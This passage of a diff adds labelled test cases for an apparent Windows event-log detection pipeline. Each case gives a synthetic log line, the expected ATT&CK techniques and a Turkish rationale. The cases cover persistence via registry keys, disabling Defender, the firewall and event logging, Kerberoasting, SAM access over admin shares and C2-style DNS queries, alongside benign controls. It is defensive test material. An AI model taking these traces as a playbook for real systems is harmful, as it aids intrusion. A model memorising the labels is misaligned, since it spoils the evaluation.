+   "attack_source": "T1546.010 AppInit DLLs (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-08",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:31:16\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  WINHOST-01$  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\evil  Object Value Name:  DllName  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\reg.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  -  New Value Type:  REG_DWORD  New Value:  C:\\Users\\Public\\n.dll\"",
+   "expected_attack_ids": [
+    "T1547.004"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Winlogon Notify saglayicisi -- oturum olaylarinda DLL yuklenir.",
+   "attack_source": "T1547.004 Winlogon Helper DLL (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-09",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:31:53\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  WINHOST-01$  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters  Object Value Name:  DataBasePath  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\reg.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  %SystemRoot%\\System32\\drivers\\etc  New Value Type:  REG_DWORD  New Value:  C:\\Users\\Public\\etc\"",
+   "expected_attack_ids": [
+    "T1112"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "hosts dosyasinin konumunu kullanici yazilabilir dizine tasimak.",
+   "attack_source": "T1112 Modify Registry (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-10",
+   "event_id": "4663",
+   "input": "Timestamp=\"2026-08-31 09:32:30\" EventID=4663 Hostname=WINHOST-01 Message=\"An attempt was made to access an object.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  jdoe  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\evil  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\spoolsv.exe  Access Request Information:  Accesses:  Set key value  Access Mask:  0x2001F\"",
+   "expected_attack_ids": [
+    "T1547.012"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Yazdirma islemcisi kaydi spooler tarafindan SYSTEM olarak yuklenir.",
+   "attack_source": "T1547.012 Print Processors (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-EK2-01",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:33:07\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  SYSTEM  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WixSvc  Object Value Name:  ImagePath  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\servicing\\TrustedInstaller.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  -  New Value Type:  REG_DWORD  New Value:  C:\\Program Files\\Vendor\\svc.exe\"",
+   "expected_attack_ids": [],
+   "expected_decision": "SUFFICIENT_BENIGN",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "BEKLENEN cift: service <- TrustedInstaller/SYSTEM. Yeni servis kaydi yazilim kurulumunun normal adimidir; Yol B bastirilmali.",
+   "attack_source": "config/actor_baseline.yaml beklenen_ciftler[0]",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-EK2-02",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:33:44\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  SYSTEM  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MsiSvc  Object Value Name:  Start  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\msiexec.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  3  New Value Type:  REG_DWORD  New Value:  2\"",
+   "expected_attack_ids": [],
+   "expected_decision": "SUFFICIENT_BENIGN",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "BEKLENEN cift: service <- msiexec/SYSTEM. Kurulum servis baslatma turunu degistirir.",
+   "attack_source": "config/actor_baseline.yaml beklenen_ciftler[0]",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-EK2-03",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:34:21\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  SYSTEM  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender  Object Value Name:  DisableAntiSpyware  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\servicing\\TrustedInstaller.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  0  New Value Type:  REG_DWORD  New Value:  1\"",
+   "expected_attack_ids": [
+    "T1685"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "BEKLENMEYEN cift: AYNI aktor, farkli varlik ailesi. Bastirma anahtari (aile, aktor) CIFTIDIR -- aktor tek basina degil. Bu satir bastirilirsa kor nokta olusur.",
+   "attack_source": "config/actor_baseline.yaml 'defender-policy <- HERHANGI BIR AKTOR' gerekcesi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-EK2-04",
+   "event_id": "4663",
+   "input": "Timestamp=\"2026-08-31 09:34:58\" EventID=4663 Hostname=WINHOST-01 Message=\"An attempt was made to access an object.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  SYSTEM  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SAM\\SAM\\Domains\\Account  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\servicing\\TrustedInstaller.exe  Access Request Information:  Accesses:  Set key value  Access Mask:  0x2001F\"",
+   "expected_attack_ids": [
+    "T1003.002"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "BEKLENMEYEN cift: credential-hive <- TrustedInstaller. Kovan erisimi icin mesru rutin aktor TANIMLANMADI.",
+   "attack_source": "config/actor_baseline.yaml 'credential-hive <- HERHANGI BIR AKTOR' gerekcesi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-01",
+   "event_id": "4720",
+   "input": "Timestamp=\"2026-08-31 09:35:35\" EventID=4720 Hostname=WINHOST-01 Message=\"A user account was created.  Subject:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  New Account:  Security ID:  WINHOST-01\\svc-helper  Account Name:  svc-helper  Account Domain:  WINHOST-01\"",
+   "expected_attack_ids": [
+    "T1136.001"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": true,
+   "rationale": "Yerel hesap olusturma tek basina kotucul degil; S-ID-02 ile birlikte zincir kurar.",
+   "attack_source": "T1136.001 Create Account: Local Account (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-02",
+   "event_id": "4732",
+   "input": "Timestamp=\"2026-08-31 09:36:12\" EventID=4732 Hostname=WINHOST-01 Message=\"A member was added to a security-enabled local group.  Subject:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Member:  Security ID:  WINHOST-01\\svc-helper  Group:  Group Name:  Administrators  Group Domain:  Builtin\"",
+   "expected_attack_ids": [
+    "T1098"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Yeni hesabin yerel Administrators'a eklenmesi -- ayricalik yukseltme ve kalicilik.",
+   "attack_source": "T1098 Account Manipulation (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-03",
+   "event_id": "4728",
+   "input": "Timestamp=\"2026-08-31 09:36:49\" EventID=4728 Hostname=WINHOST-01 Message=\"A member was added to a security-enabled global group.  Subject:  Security ID:  CORP\\admin  Member:  Security ID:  CORP\\svc-helper  Group:  Group Name:  Domain Admins  Group Domain:  CORP\"",
+   "expected_attack_ids": [
+    "T1098"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Domain Admins uyeligi -- etki alani duzeyinde ayricalik.",
+   "attack_source": "T1098 Account Manipulation (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-04",
+   "event_id": "4738",
+   "input": "Timestamp=\"2026-08-31 09:37:26\" EventID=4738 Hostname=WINHOST-01 Message=\"A user account was changed.  Subject:  Security ID:  CORP\\admin  Target Account:  Security ID:  CORP\\svc-helper  Account Name:  svc-helper  Changed Attributes:  Password Last Set:  2026-08-31T09:20:00Z  User Account Control:  Password Not Required - Enabled\"",
+   "expected_attack_ids": [
+    "T1098"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "'Password Not Required' bayraginin acilmasi hesap guvenligini dusuren bir DEGISIKLIKTIR.",
+   "attack_source": "T1098 Account Manipulation (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-05",
+   "event_id": "4756",
+   "input": "Timestamp=\"2026-08-31 09:38:03\" EventID=4756 Hostname=WINHOST-01 Message=\"A member was added to a security-enabled universal group.  Subject:  Security ID:  CORP\\admin  Member:  Security ID:  CORP\\svc-helper  Group:  Group Name:  Enterprise Admins  Group Domain:  CORP\"",
+   "expected_attack_ids": [
+    "T1098"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Enterprise Admins -- orman duzeyinde en yuksek ayricalik.",
+   "attack_source": "T1098 Account Manipulation (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-06",
+   "event_id": "4769",
+   "input": "Timestamp=\"2026-08-31 09:38:40\" EventID=4769 Hostname=WINHOST-01 Message=\"A Kerberos service ticket was requested.  Account Information:  Account Name:  jdoe@CORP.LOCAL  Service Information:  Service Name:  MSSQLSvc/db01.corp.local  Network Information:  Client Address:  ::ffff:10.0.0.55  Additional Information:  Ticket Options:  0x40810000  Ticket Encryption Type:  0x17\"",
+   "expected_attack_ids": [
+    "T1558.003"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": true,
+   "rationale": "RC4 (0x17) sifrelemeli servis bileti talebi kerberoasting'in imzasidir; tek basina kesin degil, bu yuzden inceleme bayragi.",
+   "attack_source": "T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-07",
+   "event_id": "4719",
+   "input": "Timestamp=\"2026-08-31 09:39:17\" EventID=4719 Hostname=WINHOST-01 Message=\"System audit policy was changed.  Subject:  Security ID:  WINHOST-01\\jdoe  Audit Policy Change:  Category:  Object Access  Subcategory:  Registry  Subcategory GUID:  {0CCE921E-69AE-11D9-BED3-505054503030}  Changes:  Success removed\"",
+   "expected_attack_ids": [
+    "T1685.001"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Registry denetiminin KAPATILMASI -- sonraki kanitlari yok eder. Yon onemli: 'Success removed'.",
+   "attack_source": "T1685.001 Disable or Modify Windows Event Log (v19.1; T1562.002 REVOKED)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-08",
+   "event_id": "5025",
+   "input": "Timestamp=\"2026-08-31 09:39:54\" EventID=5025 Hostname=WINHOST-01 Message=\"The Windows Firewall service has been stopped.  Subject:  Security ID:  WINHOST-01\\jdoe\"",
+   "expected_attack_ids": [
+    "T1686"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Guvenlik duvari servisinin durdurulmasi -- kontrolun BOZULMASI. Polarite: durduruldu, izin verildi degil.",
+   "attack_source": "T1686 Disable or Modify System Firewall (v19.1; T1562.004 REVOKED)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-09",
+   "event_id": "4950",
+   "input": "Timestamp=\"2026-08-31 09:40:31\" EventID=4950 Hostname=WINHOST-01 Message=\"A Windows Defender Firewall setting has changed.  Profile:  Public  Setting Type:  Firewall enabled  Value:  No  Subject:  Security ID:  WINHOST-01\\jdoe\"",
+   "expected_attack_ids": [
+    "T1686"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Guvenlik duvarinin profil bazinda kapatilmasi.",
+   "attack_source": "T1686 Disable or Modify System Firewall (v19.1; T1562.004 REVOKED)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-10",
+   "event_id": "4946",
+   "input": "Timestamp=\"2026-08-31 09:41:08\" EventID=4946 Hostname=WINHOST-01 Message=\"A change has been made to Windows Firewall exception list. A rule was added.  Profile Changed:  All  Rule Name:  AllowRDP  Rule ID:  {a1b2c3d4-0000-0000-0000-000000000001}  Rule Port:  3389\"",
+   "expected_attack_ids": [
+    "T1686"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": true,
+   "rationale": "RDP'yi disariya acan kural eklendi. G'de bu ID hic yoktu -- eski sistemin T1686.003'u 5156'dan uydurmasinin kok sebebi.",
+   "attack_source": "T1686 Disable or Modify System Firewall (v19.1; T1562.004 REVOKED)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-11",
+   "event_id": "5140",
+   "input": "Timestamp=\"2026-08-31 09:41:45\" EventID=5140 Hostname=WINHOST-01 Message=\"A network share object was accessed.  Subject:  Security ID:  CORP\\jdoe  Account Name:  jdoe  Network Information:  Object Type:  File  Source Address:  10.0.0.55  Share Name:  \\\\*\\ADMIN$  Share Path:  \\??\\C:\\Windows\"",
+   "expected_attack_ids": [
+    "T1021.002"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "ADMIN$ yonetimsel paylasimina erisim -- yanal hareket.",
+   "attack_source": "T1021.002 Remote Services: SMB/Windows Admin Shares (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-12",
+   "event_id": "5145",
+   "input": "Timestamp=\"2026-08-31 09:42:22\" EventID=5145 Hostname=WINHOST-01 Message=\"A network share object was checked to see whether client can be granted desired access.  Subject:  Security ID:  CORP\\jdoe  Network Information:  Share Name:  \\\\*\\C$  Share Path:  \\??\\C:\\  Relative Target Name:  Windows\\System32\\config\\SAM  Access Request Information:  Accesses:  ReadData (or ListDirectory)\"",
+   "expected_attack_ids": [
+    "T1003.002"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "C$ uzerinden SAM dosyasina erisim denemesi -- kimlik hirsizligi ag uzerinden.",
+   "attack_source": "T1003.002 Security Account Manager (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-13",
+   "event_id": "7040",
+   "input": "Timestamp=\"2026-08-31 09:42:59\" EventID=7040 Hostname=WINHOST-01 Message=\"The start type of the Windows Event Log service was changed from auto start to disabled.\"",
+   "expected_attack_ids": [
+    "T1685.001"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Olay gunlugu servisinin devre disi birakilmasi. Yon kanittir: auto -> disabled.",
+   "attack_source": "T1685.001 Disable or Modify Windows Event Log (v19.1; T1562.002 REVOKED)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-ID-14",
+   "event_id": "22",
+   "input": "Timestamp=\"2026-08-31 09:43:36\" EventID=22 Hostname=WINHOST-01 Message=\"Dns query:  RuleName: -  UtcTime: 2026-08-31 09:22:31.004  ProcessId: 7712  QueryName: c2.example-malware.net  QueryStatus: 0  QueryResults: ::ffff:198.51.100.7;  Image: C:\\Users\\Public\\u.exe\"",
+   "expected_attack_ids": [
+    "T1071.004"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Kullanici yazilabilir konumdaki ikilinin DNS sorgusu -- C2 kanali.",
+   "attack_source": "T1071.004 Application Layer Protocol: DNS (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-01",
+   "event_id": "5156",
+   "input": "Timestamp=\"2026-08-31 09:44:13\" EventID=5156 Hostname=WINHOST-01 Message=\"The Windows Filtering Platform has permitted a connection.  Application Information:  Process ID:  23356  Application Name:  \\device\\harddiskvolume3\\program files\\google\\chrome\\application\\chrome.exe  Network Information:  Direction:  Outbound  Source Address:  198.51.100.185  Source Port:  59902  Destination Address:  142.250.187.14  Destination Port:  443  Protocol:  6\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "POLARITE TUZAGI: 'permitted a connection' kontrolun CALISTIGINI soyler, bozuldugunu degil. Eski sistem tam bu satirlardan T1686.003 uretmisti (qradar 51 satir regresyonu).",
+   "attack_source": "Windows 5156 tanimi; app/mapping/polarity.py",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-02",
+   "event_id": "4624",
+   "input": "Timestamp=\"2026-08-31 09:44:50\" EventID=4624 Hostname=WINHOST-01 Message=\"An account was successfully logged on.  Subject:  Security ID:  NULL SID  New Logon:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Logon Type:  2  Logon Process:  User32  Authentication Package:  Negotiate  Workstation Name:  WINHOST-01\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "Etkilesimli (tip 2) basarili oturum acma -- gunun en sik kaydi. 'NULL SID' burada yokluk degil, normal bir Subject degeri.",
+   "attack_source": "Windows 4624 Logon Type 2 tanimi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-03",
+   "event_id": "4625",
+   "input": "Timestamp=\"2026-08-31 09:45:27\" EventID=4625 Hostname=WINHOST-01 Message=\"An account failed to log on.  Subject:  Security ID:  NULL SID  Account For Which Logon Failed:  Account Name:  jdoe  Failure Information:  Failure Reason:  Unknown user name or bad password.  Status:  0xC000006D  Sub Status:  0xC000006A  Logon Type:  2\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "TEK basarisiz oturum acma yanlis yazilmis paroladir. Kaba kuvvet iddiasi icin SAYI ve ZAMAN penceresi gerekir; tek satir bunu vermez.",
+   "attack_source": "Windows 4625 tanimi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-04",
+   "event_id": "4663",
+   "input": "Timestamp=\"2026-08-31 09:46:04\" EventID=4663 Hostname=WINHOST-01 Message=\"An attempt was made to access an object.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  LOCAL SERVICE  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\svchost.exe  Access Request Information:  Accesses:  Set key value  Access Mask:  0x2001F\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "GERCEKLESEN yazma ama anahtar `noise` (time-service). Kritiklik esigi tutmadigi icin Yol B atesLENMEMELI -- erisim gerceklesse bile.",
+   "attack_source": "config/asset_criticality.yaml time-service / noise",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-05",
+   "event_id": "4688",
+   "input": "Timestamp=\"2026-08-31 09:46:41\" EventID=4688 Hostname=WINHOST-01 Message=\"A new process has been created.  Creator Subject:  Security ID:  WINHOST-01\\SYSTEM  Account Name:  SYSTEM  Account Domain:  WINHOST-01  Logon ID:  0x8C112  Process Information:  New Process ID:  0x1a2c  New Process Name:  C:\\Windows\\System32\\msiexec.exe  Token Elevation Type:  %%1937  Mandatory Label:  Mandatory Label\\High Mandatory Level  Creator Process ID:  0x8f4  Creator Process Name:  C:\\Windows\\System32\\services.exe  Process Command Line:  C:\\Windows\\System32\\msiexec.exe /V\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "Windows Installer servis modunda basliyor; her kurulumda gorulur.",
+   "attack_source": "Windows Installer servis modu (/V)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-06",
+   "event_id": "7045",
+   "input": "Timestamp=\"2026-08-31 09:47:18\" EventID=7045 Hostname=WINHOST-01 Message=\"A service was installed in the system.  Service Name:  Npcap Packet Driver  Service File Name:  C:\\Windows\\System32\\drivers\\npcap.sys  Service Type:  kernel mode driver  Service Start Type:  demand start  Service Account:  \"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": true,
+   "rationale": "Mesru surucu kurulumu -- System32\\drivers konumunda ve talep uzerine basliyor. S-A-06 ile TEK farki konum ve baslatma turu; bu cift 7045'in kendisinin kanit olmadigini olcer.",
+   "attack_source": "Npcap surucusu; 7045 tanimi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-07",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:47:55\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  SYSTEM  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName  Object Value Name:  ProductName  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\servicing\\TrustedInstaller.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  Windows 11 Pro  New Value Type:  REG_DWORD  New Value:  Windows 11 Pro\"",
+   "expected_attack_ids": [],
+   "expected_decision": "SUFFICIENT_BENIGN",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "Isletim sistemi surum adinin yeniden yazilmasi (os-version / noise), aktor TrustedInstaller. Yama isleminin normal izi.",
+   "attack_source": "config/asset_criticality.yaml os-version / noise",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-08",
+   "event_id": "4769",
+   "input": "Timestamp=\"2026-08-31 09:48:32\" EventID=4769 Hostname=WINHOST-01 Message=\"A Kerberos service ticket was requested.  Account Information:  Account Name:  jdoe@CORP.LOCAL  Service Information:  Service Name:  WINHOST-01$  Network Information:  Client Address:  ::ffff:10.0.0.55  Additional Information:  Ticket Options:  0x40810000  Ticket Encryption Type:  0x12\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "AES (0x12) sifrelemeli normal bilet talebi. S-ID-06 ile TEK farki sifreleme turu -- kerberoasting sinyalinin RC4'e bagli oldugunu olcer.",
+   "attack_source": "Windows 4769 Ticket Encryption Type tanimi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-09",
+   "event_id": "5145",
+   "input": "Timestamp=\"2026-08-31 09:49:09\" EventID=5145 Hostname=WINHOST-01 Message=\"A network share object was checked to see whether client can be granted desired access.  Subject:  Security ID:  CORP\\jdoe  Network Information:  Share Name:  \\\\*\\Departman  Share Path:  \\??\\D:\\Paylasim\\Departman  Relative Target Name:  2026\\butce.xlsx  Access Request Information:  Accesses:  ReadData (or ListDirectory)\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "Sira disi olmayan dosya paylasimi erisimi. S-ID-12 ile ayni olay ID, farkli hedef -- kanit paylasimda degil HEDEFTE.",
+   "attack_source": "Windows 5145 tanimi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-10",
+   "event_id": "3",
+   "input": "Timestamp=\"2026-08-31 09:49:46\" EventID=3 Hostname=WINHOST-01 Message=\"Network connection detected:  RuleName: -  UtcTime: 2026-08-31 09:25:11.887  ProcessId: 4180  Image: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe  User: WINHOST-01\\jdoe  Protocol: tcp  SourceIp: 198.51.100.185  DestinationIp: 142.250.187.14  DestinationPort: 443  DestinationHostname: www.google.com\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "Tarayicinin normal HTTPS baglantisi. S-ID-14 ile ayni eksen, farkli surec ve hedef.",
+   "attack_source": "Sysmon Event ID 3 tanimi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-11",
+   "event_id": "4104",
+   "input": "Timestamp=\"2026-08-31 09:50:23\" EventID=4104 Hostname=WINHOST-01 Message=\"Creating Scriptblock text (1 of 1):  Get-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending | Select-Object -First 10  ScriptBlock ID: 1a2b3c4d-5e6f-7081-92a3-b4c5d6e7f809  Path:\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "Zararsiz tani script'i. 4104'un kendisi kanit degildir -- ICERIK kanittir. S-A-05 ile cift olusturur.",
+   "attack_source": "Windows PowerShell 4104 ScriptBlock tanimi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-N-12",
+   "event_id": "4672",
+   "input": "Timestamp=\"2026-08-31 09:51:00\" EventID=4672 Hostname=WINHOST-01 Message=\"Special privileges assigned to new logon.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  SYSTEM  Account Domain:  NT AUTHORITY  Logon ID:  0x3E7  Privileges:  SeAssignPrimaryTokenPrivilege  SeTcbPrivilege  SeSecurityPrivilege  SeTakeOwnershipPrivilege\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": false,
+   "rationale": "SYSTEM her acilista bu ayricaliklari alir. Ayricalikli gorunen ama tamamen rutin olan kayit.",
+   "attack_source": "Windows 4672 tanimi",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  }
+ ]
+}
